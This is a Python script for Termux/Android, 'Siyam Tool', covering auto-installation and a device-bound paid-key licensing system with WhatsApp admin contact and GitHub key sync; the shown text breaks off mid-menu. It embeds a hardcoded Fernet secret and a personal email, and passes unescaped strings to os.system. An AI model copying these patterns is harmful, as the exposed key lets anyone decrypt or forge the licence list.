# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import time
import threading

# ========== COLORS ==========
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
RESET = '\033[0m'

# ========== LOADING ANIMATION 1: PACKAGE CHECK & INSTALL ==========
def show_loading_package(stop_event):
    """Loading animation for package checking and installation"""
    spinner = ['█', '▓', '▒', '░']
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r{C}[{spinner[i % 4]}] Checking & Installing Packages...{RESET}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.1)
    sys.stdout.write(f'\r{G}[✓] Package check complete!     {RESET}\n')

# ========== LOADING ANIMATION 2: VERIFICATION ==========
def show_loading_verify(stop_event):
    """Loading animation for verification"""
    spinner = ['◐', '◓', '◑', '◒']
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r{C}[{spinner[i % 4]}] Verifying installed packages...{RESET}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.1)
    sys.stdout.write(f'\r{G}[✓] Verification complete!     {RESET}\n')

def auto_install_packages():
    """Auto install missing packages - runs only once"""
    
    # Start loading thread for package installation
    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=show_loading_package, args=(stop_loading,))
    loading_thread.start()
    
    try:
        # Update package list
        subprocess.run(['pkg', 'update', '-y'], capture_output=True, timeout=60)
        
        # Install required system packages
        subprocess.run(['pkg', 'install', 'python', 'python-pip', 'espeak', 'git', '-y'], capture_output=True, timeout=120)
        
        # Install python packages
        subprocess.run([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'], capture_output=True, timeout=60)
        subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests', 'bs4', 'cryptography', 'urllib3'], capture_output=True, timeout=120)
        
        subprocess.run(['pkg', 'install', 'python-cryptography', '-y'], capture_output=True, timeout=60)
        
        stop_loading.set()
        loading_thread.join()
        
        print(f"\n{G}[✓] All packages installed!{RESET}")
        time.sleep(1)
        
    except Exception as e:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}[!] Error: {e}{RESET}")

def check_imports():
    """Check if all packages are imported successfully"""
    packages = ['requests', 'bs4', 'cryptography']
    missing = []
    
    for pkg in packages:
        try:
            __import__(pkg)
            print(f"{G}[✓]{RESET} {pkg}")
        except ImportError:
            print(f"{R}[✗]{RESET} {pkg}")
            missing.append(pkg)
    
    return missing

def check_imports_silent():
    """Check packages silently without printing"""
    packages = ['requests', 'bs4', 'cryptography']
    missing = []
    
    for pkg in packages:
        try:
            __import__(pkg)
        except ImportError:
            missing.append(pkg)
    
    return missing

# ========== RUN ONLY IF PACKAGES MISSING ==========
def ensure_packages():
    """Main function to ensure all packages are installed"""
    print(f"\n{C}{'='*50}{RESET}")
    print(f"{Y}{' ' * 12}SIYAM TOOL - PACKAGE CHECK{RESET}")
    print(f"{C}{'='*50}{RESET}\n")
    
    # First check silently
    missing = check_imports_silent()
    
    if missing:
        print(f"\n{Y}[!] Missing packages: {', '.join(missing)}{RESET}")
        print(f"{Y}[!] Installing missing packages...{RESET}\n")
        auto_install_packages()
        
        # Second loading animation for verification
        print(f"\n{C}{'='*50}{RESET}")
        print(f"{Y}{' ' * 12}VERIFYING INSTALLATION{RESET}")
        print(f"{C}{'='*50}{RESET}\n")
        
        # Start verification loading
        stop_verify = threading.Event()
        verify_thread = threading.Thread(target=show_loading_verify, args=(stop_verify,))
        verify_thread.start()
        
        time.sleep(2)  # Simulate verification time
        
        missing = check_imports_silent()
        
        stop_verify.set()
        verify_thread.join()
        
        if missing:
            print(f"\n{R}[!] Still missing: {', '.join(missing)}{RESET}")
            print(f"{Y}[!] Please run manually:{RESET}")
            print(f"    pip install requests bs4 cryptography")
            sys.exit(1)
        else:
            print(f"\n{G}[✓] All packages installed successfully!{RESET}")
    else:
        # All packages already installed - show quick check
        print(f"{Y}[!] Checking installed packages...{RESET}\n")
        time.sleep(0.5)
        check_imports()
        print(f"\n{G}[✓] All packages already installed!{RESET}")
    
    print(f"{C}{'='*50}{RESET}\n")
    time.sleep(1)

# ========== THIS WILL RUN ONLY ONCE AT START ==========
ensure_packages()

# Continue with rest of your code...
print(f"{G}[+] All ready! Continuing to main tool...{RESET}")


# Continue with normal imports
import re
import uuid
import hashlib
import random
import string
import requests
import json
import urllib
import urllib.request
import platform
import webbrowser
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred, as_completed
from datetime import datetime, date, timedelta
from cryptography.fernet import Fernet
import signal

# ========== GLOBAL FLAG FOR EXIT ==========
exit_flag = False

# ========== SIGNAL HANDLER FOR CTRL+C ==========
def signal_handler(sig, frame):
    global exit_flag
    print(f"\n{R}[!] Exiting Siyam Tool...{RESET}")
    exit_flag = True
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ========== ENCRYPTION CONFIG ==========
SECRET_KEY = b'41EO8mHDgVMVPdE6vOqSKWC-O6I9v-TrwZkL9exJrlU='

def encrypt_keys(keys):
    f = Fernet(SECRET_KEY)
    return f.encrypt(json.dumps(keys).encode())

def decrypt_keys(encrypted):
    f = Fernet(SECRET_KEY)
    return json.loads(f.decrypt(encrypted).decode())

# ========== GITHUB CONFIG ==========
GITHUB_REPO_PATH = os.path.expanduser("~/Siyam-Tool")
GITHUB_KEYS_FILE = os.path.join(GITHUB_REPO_PATH, "approved_keys.enc")

# ========== PLATFORM DETECT ==========
SYSTEM = platform.system()
IS_ANDROID = (SYSTEM == "Android")
IS_IOS = (SYSTEM == "Darwin")

# ========== COLORS ==========
if IS_ANDROID:
    R = '\033[1;31m'
    G = '\033[1;32m'
    Y = '\033[1;33m'
    B = '\033[1;34m'
    P = '\033[1;35m'
    C = '\033[1;36m'
    W = '\033[1;37m'
    RESET = '\033[0m'
    
    DARK_RED = '\033[2;31m'
    DARK_GREEN = '\033[2;32m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_PURPLE = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_PURPLE = '\033[45m'
    BG_CYAN = '\033[46m'
    
    ORANGE = '\033[38;5;208m'
    PINK = '\033[38;5;201m'
    GOLD = '\033[38;5;220m'
    SILVER = '\033[38;5;250m'
    
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    
else:
    R = G = Y = B = P = C = W = RESET = ""
    DARK_RED = DARK_GREEN = BRIGHT_RED = BRIGHT_GREEN = ""
    BRIGHT_YELLOW = BRIGHT_BLUE = BRIGHT_PURPLE = BRIGHT_CYAN = ""
    BG_RED = BG_GREEN = BG_YELLOW = BG_BLUE = BG_PURPLE = BG_CYAN = ""
    ORANGE = PINK = GOLD = SILVER = ""
    BOLD = UNDERLINE = BLINK = REVERSE = ""

# ========== FILE PATHS ==========
def get_base_path():
    if IS_ANDROID:
        return "/storage/emulated/0/"
    else:
        return os.path.expanduser("~/")

BASE_PATH = get_base_path()
KEY_FILE = os.path.join(BASE_PATH, "approved_keys.enc")
USER_KEY_FILE = os.path.join(BASE_PATH, "siyam_user_key.txt")
OK_FILE_1 = os.path.join(BASE_PATH, "SIYAM-OLD-M1-OK.txt")
OK_FILE_2 = os.path.join(BASE_PATH, "SIYAM-OLD-M2-OK.txt")

ADMIN_LINK = "https://wa.me/message/5D3OD2FT3EYVJ1"
ADMIN_NUMBER = "+60167442160"

# ========== GITHUB SYNC ==========
def pull_from_github(silent=False):
    try:
        if not os.path.exists(GITHUB_REPO_PATH):
            if not silent:
                print(f"{Y}[!]{RESET} Cloning repository...")
            subprocess.run(["git", "clone", "https://github.com/Siyamahmed1122/Siyam-Tool.git", GITHUB_REPO_PATH], check=True, capture_output=True)
        
        os.chdir(GITHUB_REPO_PATH)
        subprocess.run(["git", "pull", "origin", "main"], check=True, capture_output=True)
        
        if os.path.exists(GITHUB_KEYS_FILE):
            subprocess.run(["cp", GITHUB_KEYS_FILE, KEY_FILE], check=True, capture_output=True)
            if not silent:
                print(f"{G}[✓]{RESET} Keys synced from GitHub!")
            return True
        else:
            if not silent:
                print(f"{Y}[!]{RESET} No encrypted keys file found, creating new...")
            return False
    except Exception as e:
        if not silent:
            print(f"{R}[!]{RESET} GitHub pull failed: {e}")
        return False

def push_to_github(silent=False):
    try:
        os.chdir(GITHUB_REPO_PATH)
        
        if os.path.exists(KEY_FILE):
            subprocess.run(["cp", KEY_FILE, GITHUB_KEYS_FILE], check=True, capture_output=True)
        else:
            if not silent:
                print(f"{R}[!]{RESET} Key file not found!")
            return
        
        subprocess.run(["git", "config", "user.name", "Siyamahmed1122"], capture_output=True)
        subprocess.run(["git", "config", "user.email", "mdsiyammadbor@gmail.com"], capture_output=True)
        
        subprocess.run(["git", "add", "approved_keys.enc"], check=True, capture_output=True)
        
        result = subprocess.run(["git", "commit", "-m", "Auto-update encrypted keys"], capture_output=True)
        
        if result.returncode == 0:
            subprocess.run(["git", "push", "origin", "main"], check=True, capture_output=True)
            if not silent:
                print(f"{G}[✓]{RESET} Encrypted keys pushed to GitHub!")
        else:
            if "nothing to commit" in result.stderr.decode():
                if not silent:
                    print(f"{Y}[i]{RESET} No changes to push.")
            else:
                if not silent:
                    print(f"{R}[!]{RESET} Commit failed: {result.stderr.decode()}")
    except Exception as e:
        if not silent:
            print(f"{R}[!]{RESET} GitHub push error: {e}")

# ========== VOICE ==========
def speak(message, msg_type="normal"):
    try:
        # For Valid ID - only voice, no text
        if msg_type == "valid_id":
            # No text print - only voice
            if IS_ANDROID:
                os.system(f'espeak "{message}" 2>/dev/null &')
            elif IS_IOS:
                os.system(f'say "{message}" 2>/dev/null &')
            return  # Exit without printing text
        
        # For all other cases - show text + voice
        if msg_type == "error":
            print(f"{R}[!] {message}{RESET}")
        elif msg_type == "success":
            print(f"{G}[+] {message}{RESET}")
        elif msg_type == "warning":
            print(f"{Y}[!] {message}{RESET}")
        else:
            print(f"{C}[i] {message}{RESET}")
        
        # Voice for all cases
        if IS_ANDROID:
            os.system(f'espeak "{message}" 2>/dev/null &')
        elif IS_IOS:
            os.system(f'say "{message}" 2>/dev/null &')
    except:
        if msg_type != "valid_id":
            print(f"{C}[i] {message}{RESET}")

# ========== LINK OPEN ==========
def open_admin_contact(admin_link, admin_number, user_key, is_renew=False):
    if is_renew:
        msg = f"Hello Admin, my key has expired. Please renew:\n{user_key}"
    else:
        msg = f"Hello Admin, please approve my key:\n{user_key}"
    
    encoded_msg = urllib.parse.quote(msg)
    wa_link = f"https://wa.me/{admin_number[1:]}?text={encoded_msg}"
    
    if IS_ANDROID:
        os.system(f'am start -a android.intent.action.VIEW -d "{wa_link}" > /dev/null 2>&1 &')
        print(f"\n{' ' * 8}{G}[+]{RESET} Opening WhatsApp...")
        return True
    elif IS_IOS:
        os.system(f'open "{wa_link}" 2>/dev/null')
        return True
    else:
        print(f"\n{' ' * 8}{Y}[!]{RESET} Manual Steps:")
        print(f"{' ' * 8}{G}[+]{RESET} Copy Key: {user_key}")
        print(f"{' ' * 8}{G}[+]{RESET} Send to: {admin_number}")
        print(f"{' ' * 8}{G}[+]{RESET} Or open: {wa_link}")
        return False

# ========== PRINT FUNCTIONS ==========
def print_line_new():
    print(f"{SILVER}{'─' * 50}{RESET}")
def print_line():
    print(f"{C}{'=' * 50}{RESET}")

def print_box(text, color=G):
    width = 50
    spaces = (width - len(text)) // 2
    print(f"{C}{'=' * width}{RESET}")
    print(f"{' ' * spaces}{color}{text}{RESET}")
    print(f"{C}{'=' * width}{RESET}")

def print_menu_box(text, color=Y):
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 12}{color}{text}{C}{' ' * (48 - 12 - len(text))}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")

def print_option_box(option, text, color=Y):
    print(f"{C}{'║'}{' ' * 4}{color}{option}{RESET} {W}{text}{C}{' ' * (48 - 6 - len(option) - len(text))}{'║'}{RESET}")

# ========== BANNER ==========
def banner():
    os.system("clear")
    print(f"{G}")
    print("    ███████╗██╗██╗   ██╗ █████╗ ███╗   ███╗")
    print("    ██╔════╝██║╚██╗ ██╔╝██╔══██╗████╗ ████║")
    print("    ███████╗██║ ╚████╔╝ ███████║██╔████╔██║")
    print("    ╚════██║██║  ╚██╔╝  ██╔══██║██║╚██╔╝██║")
    print("    ███████║██║   ██║   ██║  ██║██║ ╚═╝ ██║")
    print("    ╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝")
    print(f"{RESET}")
    print_line_new()
    print(f"{' ' * 1}{B}[OWNER : SIYAM 🔥]{RESET}")
    display_key_status()  # This shows the key with status
    print()

# ========== AUTO DELETE EXPIRED KEYS ==========
def auto_delete_expired_keys():
    keys = load_approved_keys()
    today = date.today()
    now = datetime.now()
    deleted_count = 0
    new_keys = []
    
    for item in keys:
        if item["expiry"] == "unlimited":
            new_keys.append(item)
        else:
            if " " in item["expiry"]:
                expiry_time = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                days_since_expiry = (now - expiry_time).days
                if days_since_expiry <= 30:
                    new_keys.append(item)
                else:
                    deleted_count += 1
                    print(f"{Y}[!]{RESET} Auto-deleted expired key: {item['key']} (expired on {item['expiry']})")
            else:
                expiry_date = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                days_since_expiry = (today - expiry_date).days
                if days_since_expiry <= 30:
                    new_keys.append(item)
                else:
                    deleted_count += 1
                    print(f"{Y}[!]{RESET} Auto-deleted expired key: {item['key']} (expired on {item['expiry']})")
    
    if deleted_count > 0:
        save_approved_keys(new_keys)
        push_to_github()
        print(f"{G}[✓]{RESET} Auto-deleted {deleted_count} expired key(s) (30 days grace period over)")

# ========== JSON FUNCTIONS ==========
def load_approved_keys():
    try:
        with open(KEY_FILE, "rb") as f:
            encrypted = f.read()
        keys = decrypt_keys(encrypted)
        new_keys = []
        for item in keys:
            if isinstance(item, str):
                new_keys.append({"key": item, "expiry": "unlimited"})
            else:
                new_keys.append(item)
        if new_keys != keys:
            save_approved_keys(new_keys)
        return new_keys
    except:
        default_keys = [{"key": "SIYAM-MAHMUD-2022", "expiry": "unlimited"}]
        save_approved_keys(default_keys)
        return default_keys

def save_approved_keys(keys):
    encrypted = encrypt_keys(keys)
    with open(KEY_FILE, "wb") as f:
        f.write(encrypted)

def add_new_key(new_key, expiry_days=None):
    keys = load_approved_keys()
    for item in keys:
        if item["key"] == new_key:
            print(f"{R}[-]{RESET} Already exists: {new_key}")
            return False
    if expiry_days == "unlimited" or expiry_days is None:
        expiry = "unlimited"
    else:
        expiry_date = date.today() + timedelta(days=int(expiry_days))
        expiry = expiry_date.strftime("%Y-%m-%d")
    keys.append({"key": new_key, "expiry": expiry})
    save_approved_keys(keys)
    push_to_github()
    print(f"{G}[+]{RESET} Added: {new_key} ({Y}Expires: {expiry}{RESET})")
    return True

def add_hours_key(new_key, hours=None):
    keys = load_approved_keys()
    for item in keys:
        if item["key"] == new_key:
            print(f"{R}[-]{RESET} Already exists: {new_key}")
            return False
    
    if hours is None:
        expiry = "unlimited"
    else:
        expiry_time = datetime.now() + timedelta(hours=int(hours))
        expiry = expiry_time.strftime("%Y-%m-%d %H:%M:%S")
    
    keys.append({"key": new_key, "expiry": expiry})
    save_approved_keys(keys)
    push_to_github()
    print(f"{G}[+]{RESET} Added: {new_key} ({Y}Expires: {expiry}{RESET})")
    return True

def remove_key_by_index(index):
    keys = load_approved_keys()
    if 1 <= index <= len(keys):
        removed = keys.pop(index - 1)
        save_approved_keys(keys)
        push_to_github()
        print(f"{G}[+]{RESET} Deleted: {removed['key']}")
        return True
    else:
        print(f"{R}[-]{RESET} Invalid index! Choose 1-{len(keys)}")
        return False

def get_key_status(user_key):
    """Get detailed status of a key: active/expired and expiry date"""
    keys = load_approved_keys()
    now = datetime.now()
    today = date.today()
    
    for item in keys:
        if item["key"] == user_key:
            if item["expiry"] == "unlimited":
                return {"status": "active", "expiry": "unlimited", "remaining": "unlimited"}
            else:
                if " " in item["expiry"]:
                    expiry_time = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                    if now <= expiry_time:
                        remaining = expiry_time - now
                        days = remaining.days
                        hours = remaining.seconds // 3600
                        minutes = (remaining.seconds % 3600) // 60
                        if days > 0:
                            remaining_str = f"{days}d {hours}h"
                        elif hours > 0:
                            remaining_str = f"{hours}h {minutes}m"
                        else:
                            remaining_str = f"{minutes}m"
                        return {"status": "active", "expiry": item["expiry"], "remaining": remaining_str}
                    else:
                        return {"status": "expired", "expiry": item["expiry"], "remaining": "expired"}
                else:
                    expiry_date = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                    if today <= expiry_date:
                        remaining = expiry_date - today
                        return {"status": "active", "expiry": item["expiry"], "remaining": f"{remaining.days} days"}
                    else:
                        return {"status": "expired", "expiry": item["expiry"], "remaining": "expired"}
    return {"status": "not_found", "expiry": None, "remaining": None}

def is_key_valid(user_key):
    keys = load_approved_keys()
    now = datetime.now()
    today = date.today()
    
    for item in keys:
        if item["key"] == user_key:
            if item["expiry"] == "unlimited":
                return True
            else:
                if " " in item["expiry"]:
                    expiry_time = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                    if now <= expiry_time:
                        return True
                    else:
                        print(f"\n{'='*50}")
                        print(f"{R}[!] YOUR KEY HAS EXPIRED!{RESET}")
                        print(f"{Y}[!] Expired on: {item['expiry']}{RESET}")
                        print(f"{Y}[!] You have 30 days to renew before auto-delete{RESET}")
                        print(f"{C}[+] Contact admin: {ADMIN_NUMBER}{RESET}")
                        print(f"{'='*50}\n")
                        speak("Your key has expired. Please contact admin to renew.")
                        return False
                else:
                    expiry_date = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                    if today <= expiry_date:
                        return True
                    else:
                        print(f"\n{'='*50}")
                        print(f"{R}[!] YOUR KEY HAS EXPIRED!{RESET}")
                        print(f"{Y}[!] Expired on: {item['expiry']}{RESET}")
                        print(f"{Y}[!] You have 30 days to renew before auto-delete{RESET}")
                        print(f"{C}[+] Contact admin: {ADMIN_NUMBER}{RESET}")
                        print(f"{'='*50}\n")
                        speak("Your key has expired. Please contact admin to renew.")
                        return False
    return False

def show_all_keys(show_expired_only=False):
    keys = load_approved_keys()
    today = date.today()
    now = datetime.now()
    print(f"\n{C}{'=' * 60}{RESET}")
    if show_expired_only:
        print(f"{C}{' ' * 18}EXPIRED KEYS ONLY{RESET}")
    else:
        print(f"{C}{' ' * 22}ALL KEYS{RESET}")
    print(f"{C}{'=' * 60}{RESET}")
    count = 0
    for i, item in enumerate(keys, 1):
        if item["expiry"] == "unlimited":
            expiry_show = f"{G}unlimited{RESET}"
            is_expired = False
        else:
            if " " in item["expiry"]:
                expiry_time = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                if expiry_time < now:
                    expiry_show = f"{R}EXPIRED on {item['expiry']}{RESET}"
                    is_expired = True
                else:
                    expiry_show = f"{Y}Expires: {item['expiry']}{RESET}"
                    is_expired = False
            else:
                expiry_date = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                if expiry_date < today:
                    expiry_show = f"{R}EXPIRED on {item['expiry']}{RESET}"
                    is_expired = True
                else:
                    expiry_show = f"{Y}Expires: {item['expiry']}{RESET}"
                    is_expired = False
        if show_expired_only and not is_expired:
            continue
        count += 1
        status = "EXPIRED" if is_expired else "ACTIVE"
        print(f"{' ' * 10}{i}. {C}{item['key']}{RESET} - {expiry_show} [{status}]")
    if count == 0:
        print(f"{Y}{' ' * 20}No keys found!{RESET}")
    if show_expired_only:
        print(f"{C}{'=' * 60}{RESET}")
        print(f"{Y}[!]{RESET} To renew expired keys, use option 4 and paste the key{RESET}")
    print(f"{C}{'=' * 60}{RESET}")

# ========== PERMANENT USER KEY ==========
def get_device_unique_id():
    device_id_file = os.path.join(BASE_PATH, ".siyam_device_id")
    
    try:
        if os.path.exists(device_id_file):
            with open(device_id_file, "r") as f:
                return f.read().strip()
    except:
        pass
    
    unique_id = ""
    
    if IS_ANDROID:
        try:
            result = subprocess.run(['getprop', 'ro.serialno'], capture_output=True, text=True)
            if result.stdout and result.stdout.strip():
                unique_id = result.stdout.strip()
            else:
                result = subprocess.run(['getprop', 'ro.boot.serialno'], capture_output=True, text=True)
                if result.stdout and result.stdout.strip():
                    unique_id = result.stdout.strip()
                else:
                    result = subprocess.run(['getprop', 'ro.build.fingerprint'], capture_output=True, text=True)
                    if result.stdout and result.stdout.strip():
                        unique_id = result.stdout.strip()[:20]
        except:
            pass
    
    elif IS_IOS:
        try:
            import socket
            unique_id = socket.gethostname()
            
            if not unique_id and os.path.exists("/etc/hostname"):
                with open("/etc/hostname", "r") as f:
                    unique_id = f.read().strip()
            
            if not unique_id:
                result = subprocess.run(['uuidgen'], capture_output=True, text=True)
                if result.stdout and result.stdout.strip():
                    unique_id = result.stdout.strip()[:15]
            
            if not unique_id:
                unique_id = "iPhone_Device"
        except:
            unique_id = "iPhone_Device"
    
    if not unique_id:
        unique_id = BASE_PATH
    
    device_hash = hashlib.md5(f"SIYAM_PERMANENT_{unique_id}".encode()).hexdigest()[:15]
    
    try:
        with open(device_id_file, "w") as f:
            f.write(device_hash)
    except:
        pass
    
    return device_hash

def generate_permanent_key():
    device_id = get_device_unique_id()
    key_hash = hashlib.md5(f"SIYAM_KEY_{device_id}".encode()).hexdigest()[:6].upper()
    return f"SIYAM-{key_hash}"

def save_user_key(key):
    with open(USER_KEY_FILE, "w") as f:
        f.write(key)

def get_user_key():
    try:
        if os.path.exists(USER_KEY_FILE):
            with open(USER_KEY_FILE, "r") as f:
                existing_key = f.read().strip()
                if existing_key and existing_key.startswith("SIYAM-") and len(existing_key) >= 11:
                    return existing_key
    except:
        pass
    
    new_key = generate_permanent_key()
    save_user_key(new_key)
    return new_key

# ========== RENEW FUNCTION ==========
def renew_key_by_value():
    print(f"\n{C}{'=' * 60}{RESET}")
    print(f"{C}{' ' * 20}RENEW KEY BY VALUE{RESET}")
    print(f"{C}{'=' * 60}{RESET}")
    
    while True:
        user_key = input(f"{Y}Enter the key (e.g., SIYAM-123456) or 0 to cancel: {RESET}").strip().upper()
        if user_key == '0':
            print(f"{Y}[!]{RESET} Cancelled.")
            return
        if user_key:
            break
        print(f"\n{R}{' ' * 8}[!] Input cannot be empty!{RESET}")
        time.sleep(1)
        os.system("clear")
        banner()
        print(f"{C}{'=' * 60}{RESET}")
        print(f"{C}{' ' * 20}RENEW KEY BY VALUE{RESET}")
        print(f"{C}{'=' * 60}{RESET}")
    
    keys = load_approved_keys()
    found = False
    for item in keys:
        if item["key"] == user_key:
            found = True
            if item["expiry"] == "unlimited":
                print(f"{R}[-]{RESET} Unlimited key cannot be renewed!")
                return
            
            print(f"\n{Y}[!]{RESET} Current expiry: {item['expiry']}")
            print(f"\n{G}What do you want to add?{RESET}")
            print(f"{C}   1. Add Days{RESET}")
            print(f"{C}   2. Add Hours{RESET}")
            print(f"{R}   0. Cancel{RESET}")
            
            while True:
                choice = input(f"{G}>>>{RESET} Choose (0/1/2): ")
                if choice == '0':
                    print(f"{Y}[!]{RESET} Cancelled.")
                    return
                if choice in ('1', '2'):
                    break
                print(f"\n{R}{' ' * 8}[!] Invalid! Please enter 0, 1 or 2{RESET}")
                time.sleep(1)
                os.system("clear")
                banner()
                print(f"{C}{'=' * 60}{RESET}")
                print(f"{C}{' ' * 20}RENEW KEY BY VALUE{RESET}")
                print(f"{C}{'=' * 60}{RESET}")
                print(f"\n{Y}[!]{RESET} Current expiry: {item['expiry']}")
                print(f"\n{G}What do you want to add?{RESET}")
                print(f"{C}   1. Add Days{RESET}")
                print(f"{C}   2. Add Hours{RESET}")
                print(f"{R}   0. Cancel{RESET}")
            
            if choice == "1":
                # Days selection menu
                print(f"\n{C}{'╔' + '═' * 46 + '╗'}{RESET}")
                print(f"{C}{'║'}{' ' * 12}{Y}SELECT DURATION{RESET}{' ' * 24}{C}{'║'}{RESET}")
                print(f"{C}{'╠' + '═' * 46 + '╣'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}1{RESET} → {W}3 Days (72 hours){C}{' ' * 23}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}2{RESET} → {W}7 Days (1 week){C}{' ' * 24}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}3{RESET} → {W}1 Month (30 days){C}{' ' * 22}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}4{RESET} → {W}2 Months (60 days){C}{' ' * 22}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}5{RESET} → {W}3 Months (90 days){C}{' ' * 22}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}6{RESET} → {W}4 Months (120 days){C}{' ' * 21}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}7{RESET} → {W}5 Months (150 days){C}{' ' * 21}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}8{RESET} → {W}6 Months (180 days){C}{' ' * 21}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}9{RESET} → {W}12 Months (365 days){C}{' ' * 20}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{R}0{RESET} → {W}Cancel{C}{' ' * 29}{'║'}{RESET}")
                print(f"{C}{'╚' + '═' * 46 + '╝'}{RESET}")
                
                while True:
                    month_choice = input(f"{G}{' ' * 8}[?] SELECT (0-9): {RESET}")
                    if month_choice == '0':
                        print(f"{Y}[!]{RESET} Cancelled.")
                        return
                    if month_choice in ('1','2','3','4','5','6','7','8','9'):
                        break
                    print(f"\n{R}{' ' * 8}[!] Invalid! Please enter 0-9{RESET}")
                    time.sleep(1)
                    os.system("clear")
                    banner()
                    print(f"{C}{'=' * 60}{RESET}")
                    print(f"{C}{' ' * 20}RENEW KEY BY VALUE{RESET}")
                    print(f"{C}{'=' * 60}{RESET}")
                    print(f"\n{Y}[!]{RESET} Current expiry: {item['expiry']}")
                    print(f"\n{G}What do you want to add?{RESET}")
                    print(f"{C}   1. Add Days{RESET}")
                    print(f"{C}   2. Add Hours{RESET}")
                    print(f"{R}   0. Cancel{RESET}")
                    print(f"\n{C}{'╔' + '═' * 46 + '╗'}{RESET}")
                    print(f"{C}{'║'}{' ' * 12}{Y}SELECT DURATION{RESET}{' ' * 24}{C}{'║'}{RESET}")
                    print(f"{C}{'╠' + '═' * 46 + '╣'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}1{RESET} → {W}3 Days (72 hours){C}{' ' * 23}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}2{RESET} → {W}7 Days (1 week){C}{' ' * 24}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}3{RESET} → {W}1 Month (30 days){C}{' ' * 22}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}4{RESET} → {W}2 Months (60 days){C}{' ' * 22}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}5{RESET} → {W}3 Months (90 days){C}{' ' * 22}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}6{RESET} → {W}4 Months (120 days){C}{' ' * 21}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}7{RESET} → {W}5 Months (150 days){C}{' ' * 21}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}8{RESET} → {W}6 Months (180 days){C}{' ' * 21}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{G}9{RESET} → {W}12 Months (365 days){C}{' ' * 20}{'║'}{RESET}")
                    print(f"{C}{'║'}{' ' * 4}{R}0{RESET} → {W}Cancel{C}{' ' * 29}{'║'}{RESET}")
                    print(f"{C}{'╚' + '═' * 46 + '╝'}{RESET}")
                
                month_days = {
                    '1': 3, '2': 7, '3': 30, '4': 60, '5': 90,
                    '6': 120, '7': 150, '8': 180, '9': 365
                }
                days = month_days[month_choice]
                
                # Add days to expiry
                if " " in item["expiry"]:
                    old_expiry = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                    new_expiry = old_expiry + timedelta(days=days)
                    item["expiry"] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
                else:
                    old_expiry = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                    new_expiry = old_expiry + timedelta(days=days)
                    item["expiry"] = new_expiry.strftime("%Y-%m-%d")
                    
            else:  # choice == "2" - Hours selection
                print(f"\n{C}{'╔' + '═' * 46 + '╗'}{RESET}")
                print(f"{C}{'║'}{' ' * 12}{Y}SELECT HOURS{RESET}{' ' * 24}{C}{'║'}{RESET}")
                print(f"{C}{'╠' + '═' * 46 + '╣'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}1{RESET} → {W}1 Hour{C}{' ' * 30}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}2{RESET} → {W}2 Hours{C}{' ' * 29}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}3{RESET} → {W}3 Hours{C}{' ' * 29}{'║'}{RESET}")
                print(f"{C}{'║'}{' ' * 4}{G}4{RESET} → {W}6 Hours{C}{' ' * 29}{'║'}{RESET}")
